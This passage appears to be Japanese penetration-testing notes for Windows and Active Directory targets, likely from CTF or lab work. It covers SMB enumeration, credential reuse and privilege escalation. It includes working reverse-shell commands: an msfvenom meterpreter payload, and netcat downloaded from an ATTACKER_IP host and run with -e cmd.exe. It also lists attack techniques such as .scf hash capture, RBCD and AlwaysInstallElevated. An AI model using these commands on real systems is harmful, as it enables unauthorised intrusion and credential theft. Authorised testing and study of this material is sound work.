    - 出力されたフォルダのうちREAD権限があるものに `smbclient` でアクセスして調べてみる
    - 何も出力されない場合でも `smbclient -L //DOMAIN_NAME -N` コマンドを用いれば出力される場合がある
- NSF(2049)がある場合はディレクトリをマウントできるか確認
- 共有フォルダにアクセスできる場合はアクセスして怪しいファイルをダウンロード
    - .exeなどの実行ファイルの場合は静的解析＆windows環境で動的解析
    - wiresharkでパケットをキャプチャしながら動的解析してみる
        - 何かしらの外部サーバにアクセスしている可能性
        - 認証情報を探す
- SMBにguestユーザまたは匿名ログイン( -u xxxx -p “”)が可能な場合はRIDブルートフォース攻撃でActive Directoryのアカウント情報を列挙

## ユーザシェル

- 何かしらのクレデンシャル情報を入手した場合
    - smbにログインして共有フォルダやユーザを確認
    - ldapにログインしてフォルダやユーザを列挙
    - winRMを用いてシェルを獲得
- 何かしらの認証情報を入手したらBloodhoundでADの構造を調査してみる
    - シェルを獲得できていない場合は入手した認証情報を用いてローカルで `bloodhound-python` を実行
- 何かしらの認証情報を入手したらnmapで列挙したサービスの中に利用できるものはないか探す
- 何かしらの形で共有フォルダに書き込み権限がある(ファイルアップロード可能)場合は `.scf` ファイルをアップロードして認証情報のハッシュをresponderなどで取得してみる
    - アップロード先がwebサーバではない場合はwebシェルのアップロードは意味がない可能性
- SMBまたはLDAPに任意のクレデンシャル情報でアクセスできた場合は他のユーザ情報の列挙を試みる(netexecを利用)

## リバースシェル

### metasploitを利用

msfvenomを用いてリバースシェルのスクリプトを作成

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=1337 -f exe > shellx86.exe
```

何かしらの方法でターゲットにスクリプトをアップロード

metasploitを用いて待受ポートを起動

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST YOUR_IP
set LPORT 1337
run
```

何かしらの方法でアップロードしたスクリプトを管理者権限で実行

プロセス一覧を確認して管理者権限のプロセスに移動

```bash
ps
migrate PID
shell
```

### SMBの簡易サーバを立ち上げてリバースシェルを構築

smbserverを用いてローカルでSMBサーバを立ち上げる。

```bash
smbserver.py SHARE_NAME SHARED_FOLDER_PATH -smb2support -username USER_NAME -password PASSWORD
```

上のコマンドでSMBサーバを立ち上げた後、攻撃対象からSMBサーバへは以下のコマンドでアクセス。

```powershell
net use \\\\ATTACKER_IP\\SHARE_NAME /user:USER_NAME PASSOWORD
```

リバースシェルを構築する場合はローカルから `nc64.exe` をアップロードして攻撃対象からローカルの待受ポートにアクセスする。

```powershell
copy \\\\ATTACKER_IP\\SHARED_FOLDER\\nc64.exe \\programdata\\nc.exe
\\programdata\\nc.exe -e cmd ATTACKER_IP PORT_NUMBER
```

### pythonでHTTPサーバを立ち上げてリバースシェルを構築

pythonを用いてローカルの `nc.exe` があるディレクトリでHTTPサーバを立ち上げる。

```powershell
python3 -m http.server 8080
```

攻撃対象でcurlを用いてncをダウンロードして実行。

```powershell
cd \\programdata
curl http://ATTACKER_IP:8080/nc.exe -o nc.exe
```

ローカルでリバースシェル用のポートを立ち上げる。

```powershell
rlwrap nc -nlvp 1111
```

攻撃対象でncを実行。

```powershell
nc.exe -e cmd.exe ATTACKER_IP 1111
```

あるいはpowershellを実行しても良い。

```powershell
nc.exe -e powershell.exe ATTACKER_IP 1111
```

## 権限昇格

- `whoami /all` でユーザの所属グループや権限を確認
- `tasklist` で怪しいアプリケーションを探す
    - リモート接続のアプリケーションなど
    - 怪しいアプリケーションがある場合は既知の脆弱性がないか検索
    - 怪しいアプリケーションをの具体的な中身は `C:\\Program Files` を参照。
- とりあえずwinPEASを実行してみる
- Server Operatorsグループに属している場合はサービスを編集することができるので、 `sc` コマンドを用いてVSSのような管理者権限で動作するデフォルトのサービスの実行パスを変更してリバースシェルを確立可能
- `netstat -ano | findstr TCP | findstr ":0"` コマンドを実行してすべてのアドレスからの接続を受け付けているTCPポートを表示
    - プロセスIDは頻繁に変化するので何回か実行しないと表示されないプロセスが存在する可能性
    - 出力から怪しいポートを見つけたらそのプロセスIDを `tasklist /v | findstr PID` で検索して具体的に調べてみる
- 怪しい実行ファイルを見つけたら `searchsploit` やGoogleでそのファイル名の脆弱性を調べてみる
- `net user USER_NAME` で現在のユーザの所属グループなどを確認
- PowerShellのコマンド履歴( `ConsoleHost_history.txt` )を確認
- LAPSに関する何かしらの権限を持っている場合はローカル管理者のパスワードを取得できる可能性
- Kerberosの事前認証が無効になっているユーザを探す
    - `Get-ADUser -Filter * -Properties DoesNotRequirePreAuth | Where-Object {$_.DoesNotRequirePreAuth -eq $true} | Select-Object Name,SamAccountName`
- 平行移動先のアカウント(または管理者アカウント)が所属するグループが `GenericAll` 権限を有しており、シェル奪取済みのアカウントに対して権限委譲がされている場合、RBCD攻撃が可能
    - `PowerView.ps1` や `Powermad.ps1` をアップロードしたうえで攻撃を試す
- BloodHoundでコントロール済みのユーザの権限やグループの関係、目標となる管理者アカウント、DCまでのパスなどを把握しておく
- `AlwaysInstallElevated` がHKCUとHKLM両方で有効な場合は権限昇格が可能
- `Backup Operators` グループに所属している場合は権限昇格が可能
    - これ以外にも怪しいグループがあったら権限昇格の糸口がないか検索してみた方が良い